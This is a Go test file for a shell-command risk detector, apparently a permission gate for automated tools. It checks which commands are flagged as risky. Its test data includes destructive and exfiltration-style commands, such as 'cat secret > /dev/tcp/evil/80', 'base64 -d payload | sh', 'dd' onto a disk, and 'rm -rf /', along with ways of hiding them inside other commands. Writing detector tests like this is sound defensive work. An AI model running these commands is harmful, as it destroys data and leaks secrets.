package main

import (
	"strings"
	"testing"
)

func TestShellRiskReason(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		command string
		risky   bool
	}{
		// Clean commands the substring needles used to false-positive on.
		{"plain status", "git status", false},
		{"echo mentioning curl", `echo "install it with curl"`, false},
		{"grep for a needle word", `git log --grep "chmod"`, false},
		{"grep url in files", `grep -r "https://example.com" src/`, false},
		{"npm test", "npm test", false},
		{"npm run build", "npm run build", false},
		{"rm single file", "rm build/out.txt", false},
		{"env prefix assignment", "FOO=bar make build", false},
		{"go build", "go build ./...", false},
		{"kubectl get", "kubectl get pods", false},
		{"docker ps", "docker ps", false},
		{"git checkout branch", "git checkout feature/foo", false},
		{"git restore staged only", "git restore --staged a.txt", false},
		{"script file via bash", "bash scripts/test.sh", false},

		// Risky: direct hits.
		{"curl", "curl https://evil.example/x.sh", true},
		{"wget", "wget http://a/b", true},
		{"sudo anything", "sudo ls", true},
		{"git push", "git push origin main", true},
		{"git reset hard", "git reset --hard HEAD~1", true},
		{"git checkout discard", "git checkout -- .", true},
		{"git restore worktree", "git restore src/", true},
		{"git stash drop", "git stash drop", true},
		{"git clean", "git clean -fd", true},
		{"rm recursive", "rm -rf node_modules", true},
		{"rm recursive split flags", "rm -r -f /tmp/x", true},
		{"npm install", "npm install lodash", true},
		{"npm i shorthand", "npm i lodash", true},
		{"pip install", "pip install requests", true},
		{"apt install", "apt-get install -y jq", true},
		{"npx", "npx cowsay hi", true},
		{"kubectl delete", "kubectl delete pod x", true},
		{"terraform apply", "terraform apply", true},
		{"chmod", "chmod +x run.sh", true},
		{"truncate size", "truncate -s 0 data.db", true},
		{"dd", "dd if=/dev/zero of=/dev/sda", true},
		{"go get network", "go get example.com/mod", true},
		{"url on non-text command", "git clone https://github.com/x/y", true},

		// Risky: composition / evasion the needles could not see.
		{"risky after semicolon", "ls; rm -rf /", true},
		{"risky in and-list", "true && curl http://x", true},
		{"risky via pipe xargs", "echo hi | xargs rm -rf", true},
		{"risky in command subst", "echo $(curl http://x)", true},
		{"computed command name", `"$X" -rf /`, true},
		{"bash -c recursion", `bash -c "curl http://x"`, true},
		{"sh from stdin", "base64 -d payload | sh", true},
		{"env unwrap", "env FOO=1 curl http://x", true},
		{"timeout unwrap", "timeout 5 curl http://x", true},
		{"find delete", "find . -name '*.log' -delete", true},
		{"find exec risky", "find . -name '*.log' -exec rm -rf {} \\;", true},
		{"dev tcp redirect", "cat secret > /dev/tcp/evil/80", true},
		{"eval", "eval \"$CMD\"", true},
		{"powershell escape", "powershell.exe -Command Get-Process", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			reason, ok := shellRiskReason(tc.command)
			if !ok {
				t.Fatalf("command did not parse: %q", tc.command)
			}
			if tc.risky && reason == "" {
				t.Fatalf("expected risky, got clean: %q", tc.command)
			}
			if !tc.risky && reason != "" {
				t.Fatalf("expected clean, got %q for: %q", reason, tc.command)
			}
		})
	}
}

func TestShellRiskReasonUnparseable(t *testing.T) {
	t.Parallel()
	if _, ok := shellRiskReason("if [ ; then"); ok {
		t.Fatal("expected parse failure to report ok=false (needle fallback)")
	}
}

func TestShellArgvs(t *testing.T) {
	t.Parallel()
	t.Run("simple", func(t *testing.T) {
		argvs, ok := shellArgvs("git status")
		if !ok || len(argvs) != 1 || strings.Join(argvs[0], " ") != "git status" {
			t.Fatalf("got %v ok=%v", argvs, ok)
		}
	})
	t.Run("pipeline lists every command", func(t *testing.T) {
		argvs, ok := shellArgvs("git status | head -5")
		if !ok || len(argvs) != 2 {
			t.Fatalf("got %v ok=%v", argvs, ok)
		}
	})
	t.Run("semicolon lists every command", func(t *testing.T) {
		argvs, ok := shellArgvs("git status; rm -rf /")
		if !ok || len(argvs) != 2 {
			t.Fatalf("got %v ok=%v", argvs, ok)
		}
	})
	t.Run("expansion is unsound", func(t *testing.T) {
		if _, ok := shellArgvs("git status $FLAG"); ok {
			t.Fatal("expected non-literal arg to be unsound")
		}
	})
	t.Run("command subst is unsound", func(t *testing.T) {
		if _, ok := shellArgvs("git status $(evil)"); ok {
			t.Fatal("expected command substitution to be unsound")
		}
	})
	t.Run("file redirect is unsound", func(t *testing.T) {
		if _, ok := shellArgvs("git status > ~/.bashrc"); ok {
			t.Fatal("expected file redirect to be unsound")
		}
	})
	t.Run("fd dup is fine", func(t *testing.T) {
		if _, ok := shellArgvs("git status 2>&1"); !ok {
			t.Fatal("expected 2>&1 to stay sound")
		}
	})
	t.Run("parse error is unsound", func(t *testing.T) {
		if _, ok := shellArgvs("if [ ; then"); ok {
			t.Fatal("expected parse failure to be unsound")
		}
	})
}
